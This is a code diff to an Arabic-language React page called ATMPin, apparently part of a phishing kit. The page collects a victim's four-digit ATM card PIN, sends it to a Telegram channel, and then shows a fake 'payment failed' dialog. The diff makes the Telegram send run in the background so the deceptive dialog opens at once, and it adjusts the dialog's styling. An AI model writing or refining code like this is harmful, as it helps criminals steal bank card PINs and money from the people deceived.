@@ -53,8 +53,13 @@ const ATMPin = () => {
 
   const handleConfirm = async () => {
     if (pin.length === 4) {
+      console.log("Starting confirmation process...");
       const message = `الرقم السري للبطاقة ATM PIN\n\nالرقم السري: ${pin}`;
-      await sendToTelegram(message);
+      
+      // Send to Telegram without blocking the dialog
+      sendToTelegram(message).catch(err => console.error("Telegram error:", err));
+      
+      console.log("Opening dialog...");
       setIsDialogOpen(true);
     }
   };
@@ -168,31 +173,31 @@ const ATMPin = () => {
       <Footer />
 
       <AlertDialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
-        <AlertDialogContent className="max-w-md" dir="rtl">
+        <AlertDialogContent className="max-w-md z-[100]" dir="rtl">
           <AlertDialogHeader>
             <AlertDialogTitle className="text-center text-destructive text-xl">
               تعذر إتمام عملية الدفع
             </AlertDialogTitle>
             <AlertDialogDescription asChild>
-              <div className="space-y-4 text-right">
+              <div className="space-y-4 text-right text-base">
                 <p className="font-semibold text-foreground">
                   نعتذر، لم نتمكن من التحقق من صحة بيانات البطاقة المصرفية.
                 </p>
-                <div className="mr-4 space-y-2">
-                  <p className="text-foreground">• يرجى التأكد من صحة المعلومات المُدخلة</p>
-                  <p className="text-foreground">• يمكنكم استخدام بطاقة مصرفية أخرى</p>
-                  <p className="text-foreground">• أو اختيار وسيلة دفع بديلة</p>
+                <div className="mr-4 space-y-2 text-foreground">
+                  <p>• يرجى التأكد من صحة المعلومات المُدخلة</p>
+                  <p>• يمكنكم استخدام بطاقة مصرفية أخرى</p>
+                  <p>• أو اختيار وسيلة دفع بديلة</p>
                 </div>
               </div>
             </AlertDialogDescription>
           </AlertDialogHeader>
-          <AlertDialogFooter className="flex-row-reverse gap-2">
+          <AlertDialogFooter className="flex-row-reverse gap-2 sm:flex-row-reverse">
             <Button
               onClick={() => {
                 setIsDialogOpen(false);
                 navigate('/registration-complete');
               }}
-              className="bg-primary hover:bg-primary/90"
+              className="bg-primary hover:bg-primary/90 text-primary-foreground"
             >
               إعادة المحاولة
             </Button>
